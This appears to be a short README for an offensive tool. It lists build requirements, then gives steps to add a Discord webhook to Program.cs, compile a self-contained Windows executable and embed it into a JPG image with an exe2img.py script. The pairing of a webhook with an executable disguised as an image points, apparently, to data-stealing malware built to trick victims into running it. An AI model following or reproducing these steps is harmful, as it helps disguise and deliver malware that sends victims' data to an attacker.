## Requirements

[WinRAR](https://www.rarlab.com/download.htm?source=post_page-----81ee5339707e---------------------------------------)  
[Resource Hacker](https://www.angusj.com/resourcehacker/)  
[ImageMagick](https://imagemagick.org/script/download.php)

```
pip install wand
dotnet add package Newtonsoft.Json
dotnet add package System.Management
```

## Usage
1. Add your discord webhook in `Program.cs` and compile
    ```
    dotnet publish -c Release -r win-x64 --self-contained true -p:PublishSingleFile=true -p:EnableCompressionInSingleFile=true -o dist
    ```
2. Run `exe2img.py` to embed the exectuable into an image
    ```
    python exe2img.py -e your_executable.exe -i your_image.jpg
    ```